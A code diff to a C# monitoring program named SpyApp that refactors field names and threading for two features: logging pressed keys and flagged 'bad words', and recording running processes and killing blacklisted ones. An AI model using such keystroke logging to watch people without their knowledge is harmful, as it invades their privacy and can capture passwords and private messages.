@@ -31,19 +31,21 @@ namespace SpyApp
         /// </summary>
         public void On()
         {
-            if (_spyInfo.StatsOn || _spyInfo.ModerOn)
+            if (_spyInfo.WhereToWriteProcs != string.Empty)
             {
-                Thread statsThread = new Thread(new ThreadStart(ProcessesThreadFunct));
-                statsThread.Start();
-
-                Thread keysThread = new Thread(new ThreadStart(PressedKeysStats));
+                Thread procsThread = new Thread(new ThreadStart(ProcessesThreadFunct));
+                procsThread.Start();
+            }
+            if (_spyInfo.WhereToWriteKeys != string.Empty)
+            {
+                Thread keysThread = new Thread(new ThreadStart(PressedKeysThreadFunct));
                 keysThread.Start();
-            }                  
+            }                                  
         }
         ///processes
         private void ProcessesThreadFunct()
         {
-            if (_spyInfo.BadAppsPath != string.Empty)
+            if (_spyInfo.WhereToReadBadApps != string.Empty)
                 ReadBadAppsFromFile();
 
             TryGetAdminMode();
@@ -54,7 +56,7 @@ namespace SpyApp
         {
             try
             {
-                using (StreamReader sr = new StreamReader(_spyInfo.BadAppsPath))
+                using (StreamReader sr = new StreamReader(_spyInfo.WhereToReadBadApps))
                 {
                     while (!sr.EndOfStream)
                         _badApps.Add(sr.ReadLine());
@@ -123,7 +125,7 @@ namespace SpyApp
                 info += GetProcInfo(p);
             }
 
-            WriteToFile(_spyInfo.LaunchedProcesses, info);
+            WriteToFile(_spyInfo.WhereToWriteProcs, info);
         }
         private string GetProcInfo(Process prc)
         {
@@ -136,7 +138,7 @@ namespace SpyApp
                 {
                     info += "BAD PROCESS!\n";
 
-                    if (_spyInfo.CloseBadApp)
+                    if (_spyInfo.IsCloseBadApp)
                         prc.Kill();
                 }
                 else
@@ -144,8 +146,8 @@ namespace SpyApp
             }
             catch(Exception e)
             {
-                info = e.Message + prc.ProcessName + "\n";
-                Console.WriteLine(e.Message);
+                info = e.Message + " : " + prc.ProcessName + "\n";
+                //Console.WriteLine(e.Message);
             }
 
             return info;
@@ -168,14 +170,13 @@ namespace SpyApp
             }
         }
         
-
         ///keys
-        private void PressedKeysStats()
+        private void PressedKeysThreadFunct()
         {
             StartMonitKeys(
-                _spyInfo.PressedKeys, 
-                _spyInfo.TypedBadWords, 
-                _spyInfo.BadWordsPath);
+                _spyInfo.WhereToWriteKeys, 
+                _spyInfo.WhereToWriteWords, 
+                _spyInfo.WhereToReadBadWords);
         }
     }
 }
